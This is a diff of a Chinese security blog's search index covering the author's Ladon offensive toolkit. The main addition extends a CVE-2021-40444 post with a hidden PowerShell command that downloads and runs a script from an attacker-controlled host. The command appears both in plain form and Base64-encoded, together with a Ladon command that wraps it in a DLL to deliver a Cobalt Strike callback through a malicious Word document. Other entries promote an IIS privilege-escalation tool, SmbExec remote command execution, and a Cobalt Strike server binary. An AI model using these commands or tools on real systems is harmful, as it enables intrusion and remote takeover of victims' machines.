@@ -1454,8 +1454,15 @@ window.location.href="http://k8gege.org/Ladon/CVE-2021-40444.html";
 <h4 id="启动web监听"><a href="#启动web监听" class="headerlink" title="启动web监听"></a>启动web监听</h4><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/CVE-2021-40444-htm.PNG"></p>
 <h4 id="doc样本修改"><a href="#doc样本修改" class="headerlink" title="doc样本修改"></a>doc样本修改</h4><p>样本9月10号已发在小密圈，docx后缀改为cab或zip，即可编辑rels文件，指向Ladon监听的地址poc.html，保存再改名为.docx</p>
 <p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/CVE-2021-40444-doc.PNG"></p>
-<h4 id="测试动图"><a href="#测试动图" class="headerlink" title="测试动图"></a>测试动图</h4><p>在win10上执行doc文件时，可通过Ladon监听看到整个请求过程，docx先访问html，由漏洞触发加载我们封装的CAB文件，通过CPL执行安装INF，加载我们的DLL，演示DLL功能为弹计算器。</p>
+<h4 id="弹计算器演示"><a href="#弹计算器演示" class="headerlink" title="弹计算器演示"></a>弹计算器演示</h4><p>在win10上执行doc文件时，可通过Ladon监听看到整个请求过程，docx先访问html，由漏洞触发加载我们封装的CAB文件，通过CPL执行安装INF，加载我们的DLL，演示DLL功能为弹计算器。</p>
 <p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/cve-2021-40444.gif"></p>
+<h3 id="Cobalt-Strike上线"><a href="#Cobalt-Strike上线" class="headerlink" title="Cobalt Strike上线"></a>Cobalt Strike上线</h3><h4 id="Base64加密"><a href="#Base64加密" class="headerlink" title="Base64加密"></a>Base64加密</h4><p>LadonGui—Encode–Base64Unicode加密</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c <span class="string">"IEX ((new-object net.webclient).downloadstring('http://192.168.250.25:80/a'))"</span></span><br></pre></td></tr></table></figure>
+
+<p>PS： 其它复杂CMD语句同理</p>
+<h4 id="生成DLL"><a href="#生成DLL" class="headerlink" title="生成DLL"></a>生成DLL</h4><p>Ladon.exe CmdDll b64x64 cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACAAIgBJAEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAyADUAMAAuADIANQA6ADgAMAAvAGEAJwApACkAIgA=</p>
+<p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/cs_base64.PNG"></p>
+<h4 id="CS上线演示"><a href="#CS上线演示" class="headerlink" title="CS上线演示"></a>CS上线演示</h4><p><img alt data-original="http://k8gege.org/k8img/Ladon/exe/cve-2021-40444-cs.gif"></p>
 <h3 id="SmbExec用法"><a href="#SmbExec用法" class="headerlink" title="SmbExec用法"></a>SmbExec用法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Load SmbExec</span><br><span class="line">Usage:</span><br><span class="line">Ladon SmbExec host user pass cmd whoami</span><br><span class="line">Ladon SmbExec host user pass b64cmd dwBoAG8AYQBtAGkA</span><br></pre></td></tr></table></figure>
 
 <h3 id="SmbExec执行"><a href="#SmbExec执行" class="headerlink" title="SmbExec执行"></a>SmbExec执行</h3><p>在Cobalt Strike的shell下执行SmbExec需要带空格引号参数时，CS转义有问题，使用正常CMD命令比较麻烦，所以我增加了个b64cmd参数便于在CS下使用(这个方法在几个月前的BypassUac里使用，很多人不知道为什么这样做，直接CMD命令不好吗，非要经过一步加密，当你要执行的CMD命令含有很多转义时你就知道了，得经过CS转义成CMD转义得到正常CMD很麻烦)。b64cmd命令可通过LadonGUI 8.2以后版本使用Base64Unicode加密生成</p>
@@ -3490,8 +3497,8 @@ window.location.href="http://k8gege.org/Ladon/cve-2020-0688.html";
 <h3 id="Ladon下载"><a href="#Ladon下载" class="headerlink" title="Ladon下载"></a>Ladon下载</h3><p>历史版本: <a href="https://github.com/k8gege/Ladon/releases" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/releases</a><br>7.0版本：<a href="https://k8gege.org/Download">https://k8gege.org/Download</a><br>7.5版本：K8小密圈</p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>CVE-2020-0688</tag>
@@ -4248,8 +4255,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
       <categories>
         <category>Ladon</category>
         <category>Cobalt Strike</category>
-        <category>内网渗透</category>
         <category>远程执行</category>
+        <category>内网渗透</category>
       </categories>
       <tags>
         <tag>Cobalt Strike</tag>
@@ -5088,8 +5095,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x006-视频教程"><a href="#0x006-视频教程" class="headerlink" title="0x006 视频教程"></a>0x006 视频教程</h3><p>Video1: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20Apache%20ActiveMQ%20GetShell%20CVE-2016-3088.rar" target="_blank" rel="noopener">K8Cscan Apache ActiveMQ GetShell CVE-2016-3088</a><br><br>Video2: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20WhatCMS%20GetShell.rar" target="_blank" rel="noopener">WhatCMS指纹识别内网ActiveMQ&amp;GetShell</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -5112,8 +5119,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p>通过EXP生成器将以上Payload转成DLL，使用Ladon即可批量利用,详情请观看视频教程<br><br>Video: <a href="https://github.com/k8gege/K8CScan/blob/master/Video/K8Cscan%20ThinkPHP%205.x%20RCE%20Exploit.rar" target="_blank" rel="noopener">K8Cscan ThinkPHP 5.x RCE Exploit</a><br></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -5137,8 +5144,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <p><img alt data-original="https://k8gege.github.io/k8img/Ladon/exp/CVE-2018-2894_3.png"></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -5168,8 +5175,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="0x005-下载"><a href="#0x005-下载" class="headerlink" title="0x005 下载"></a>0x005 下载</h3><p><a href="https://github.com/k8gege/K8CScan/tree/master/ExpGenerator" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/ExpGenerator</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -5371,8 +5378,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>Poc: <a href="https://github.com/k8gege/CVE-2019-11043" target="_blank" rel="noopener">https://github.com/k8gege/CVE-2019-11043</a><br>Ladon: <a href="https://github.com/k8gege/Ladon" target="_blank" rel="noopener">https://github.com/k8gege/Ladon</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -5693,8 +5700,8 @@ window.location.href="http://k8gege.org/Ladon/sshscan.html";
 <h3 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h3><p><a href="https://github.com/k8gege/MS17010EXP" target="_blank" rel="noopener">https://github.com/k8gege/MS17010EXP</a></p>
 ]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
       </categories>
       <tags>
         <tag>Exp</tag>
@@ -5805,26 +5812,6 @@ Microsoft Windows 10 for 32-bit Systems 0
       </tags>
   </entry>
   <entry>
-    <title>Cobalt Strike TeamServer For Windows</title>
-    <url>/p/22e5f4a8.html</url>
-    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
-<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
-<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
-<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
-<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
-<p><strong>0x003 下载</strong></p>
-<p>TeamServer.exe</p>
-<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
-      <categories>
-        <category>工具</category>
-        <category>Cobalt Strike</category>
-      </categories>
-      <tags>
-        <tag>Tool</tag>
-        <tag>Cobalt Strike</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>CobaltStrike &amp; Metasploit Shellcode一键免杀工具</title>
     <url>/p/9cffe32c.html</url>
     <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 前言</strong></span></p>
@@ -5851,6 +5838,26 @@ Microsoft Windows 10 for 32-bit Systems 0
         <tag>Tool</tag>
         <tag>Cobalt Strike</tag>
         <tag>Metasploit</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Cobalt Strike TeamServer For Windows</title>
+    <url>/p/22e5f4a8.html</url>
+    <content><![CDATA[<p><img alt data-original="http://k8gege.org/k8img/posts/TeamServer.png"></p>
+<p><strong>Cobalt Strike 3.x TeamServer for Windows<br></strong></p>
+<p><strong>0x001 环境</strong><br><br>CS 3.12 或 3.13 </p>
+<p>Kali或Win最好安装jdk1.8.5或之后版本<br><br>设置环境变量,如path=C:\Program Files\Java\jdk1.8.0_05\bin<br><br><strong>0x002 启动中转</strong><br>启动TeamServer.exe(第一次运行Win7后系统需右键管理员)<br><br>TeamServer.exe IP pass</p>
+<p><span style="color: #ff00ff;">20190306编译版无需kali下生成cobaltstrike.store文件</span></p>
+<p><strong>0x003 下载</strong></p>
+<p>TeamServer.exe</p>
+<p><a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/raw/master/TeamServer.exe</a></p>]]></content>
+      <categories>
+        <category>工具</category>
+        <category>Cobalt Strike</category>
+      </categories>
+      <tags>
+        <tag>Tool</tag>
+        <tag>Cobalt Strike</tag>
       </tags>
   </entry>
   <entry>
@@ -6422,8 +6429,8 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
 <p>Cscan: <a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
 <p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>]]></content>
       <categories>
-        <category>Ladon</category>
         <category>Exp</category>
+        <category>Ladon</category>
         <category>工具</category>
       </categories>
       <tags>
@@ -6529,6 +6536,33 @@ exploit(dip, dport, &quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;)</cod
       </tags>
   </entry>
   <entry>
+    <title>全版本IIS提权工具iislpe</title>
+    <url>/p/6b9b3afe.html</url>
+    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
+<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
+<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
+<p><strong>原理:</strong></p>
+<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
+<p><strong>用法:</strong></p>
+<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
+<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
+<p>&nbsp;</p>
+<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
+<p>&nbsp; &nbsp;&nbsp; </p>
+<p>&nbsp;</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
+      <categories>
+        <category>提权</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>LPE</tag>
+        <tag>IIS</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>基于Browser协议探测内网主机</title>
     <url>/p/16b5ff0b.html</url>
     <content><![CDATA[<p>利用Browser协议可获取机器IP、MAC、机器名、操作系统、域，如图</p>
@@ -6594,42 +6628,15 @@ from pprint import pprint
         <category>主机发现</category>
         <category>源码</category>
         <category>内网渗透</category>
+        <category>嗅探</category>
         <category>信息收集</category>
         <category>编程</category>
         <category>Python</category>
-        <category>嗅探</category>
       </categories>
       <tags>
         <tag>Code</tag>
         <tag>Tool</tag>
         <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>全版本IIS提权工具iislpe</title>
-    <url>/p/6b9b3afe.html</url>
-    <content><![CDATA[<p><strong>工具: </strong>iislpe.exe<strong><br></strong></p>
-<p><strong>编译: </strong><a href="https://www.cnblogs.com/k8gege" target="_blank">.</a>net 3.5 </p>
-<p>　　全版本IIS提权工具<a href="https://www.cnblogs.com/k8gege" target="_blank">,</a>支持IIS应用池用户/网络服务用户/本地服务用户</p>
-<p><strong>原理:</strong></p>
-<p><em>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </em>通过NTLM重放将权限提升至SYSTEM权限,详情参考Potato。</p>
-<p><strong>用法:</strong></p>
-<p>IIS Priviledge by k8gege<br>IIS APPPOOL / Network Service / Local Service<br>Us<a href="https://www.cnblogs.com/k8gege/" target="_blank">e</a>age:<br>iislpe c<a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank">:</a>\any.bat<br>iislpe c:\any.exe</p>
-<p><a href="https://www.cnblogs.com/k8gege/p/10389522.html" target="_blank"><img alt data-original="http://k8gege.org/k8img/posts/iislpe.png"></a></p>
-<p>&nbsp;</p>
-<p>&nbsp;下载:https://github.com/k8gege/K8tools/iislpe.rar</p>
-<p>&nbsp; &nbsp;&nbsp; </p>
-<p>&nbsp;</p>
-<p>&nbsp;&nbsp;&nbsp;&nbsp; </p>]]></content>
-      <categories>
-        <category>提权</category>
-        <category>工具</category>
-      </categories>
-      <tags>
-        <tag>Exp</tag>
-        <tag>Tool</tag>
-        <tag>LPE</tag>
-        <tag>IIS</tag>
       </tags>
   </entry>
 </search>
